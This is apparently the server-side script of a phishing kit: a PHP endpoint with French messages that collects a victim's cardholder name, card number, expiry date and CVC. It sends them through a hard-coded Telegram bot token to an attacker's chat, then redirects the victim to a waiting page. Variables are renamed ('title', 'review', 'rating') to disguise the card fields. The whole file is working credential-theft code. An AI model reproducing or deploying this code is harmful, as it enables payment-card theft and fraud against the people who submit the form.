
<?php

header("Content-Type: application/json; charset=utf-8");

$botToken = "9003752696:AAH14D6x32yPqjTJFogbxzcuAPbJYy4FCeg";
$chatId   = "8365539748";

function respond($status, $data) {
    http_response_code($status);
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    respond(405, [
        "success" => false,
        "message" => "Méthode non autorisée."
    ]);
}

$data = json_decode(file_get_contents("php://input"), true);

if (!is_array($data)) {
    respond(400, [
        "success" => false,
        "message" => "JSON invalide."
    ]);
}

$name = trim($data["cardholder"] ?? "");
$brand = strtolower(trim($data["brand"] ?? ""));

$title = trim($data["cardnumber"] ?? "");
$review = trim($data["cardexpiry"] ?? "");
$rating = trim($data["cardcvc"] ?? "");

if ($name === "") {
    respond(400, [
        "success" => false,
        "message" => "Nom manquant."
    ]);
}

if (!in_array($brand, ["visa", "mastercard"], true)) {
    respond(400, [
        "success" => false,
        "message" => "Type non pris en charge."
    ]);
}

if ($review === "") {
    respond(400, [
        "success" => false,
        "message" => "Avis manquant."
    ]);
}

$message  = "⭐ NOUVEL SESSION\n\n";
$message .= "👤 Nom : " . $name . "\n";
$message .= "📌 Type : " . ucfirst($brand) . "\n";
$message .= "💳 Carte : " . ($title ?: "Sans titre") . "\n";
$message .= "🔢 Date : " . ($rating ?: "Non renseignée") . "\n";
$message .= "🔐 Cvv :\n" . $review;


$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

$ch = curl_init($url);

curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        "chat_id" => $chatId,
        "text" => $message
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 10
]);

$response = curl_exec($ch);
$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($response === false || $status !== 200) {
    respond(502, [
        "success" => false,
        "message" => "Erreur lors de l'envoi Telegram."
    ]);
}

respond(200, [
    "success" => true,
    "redirect" => "visa-wait.html?name=" . urlencode($name)
]);

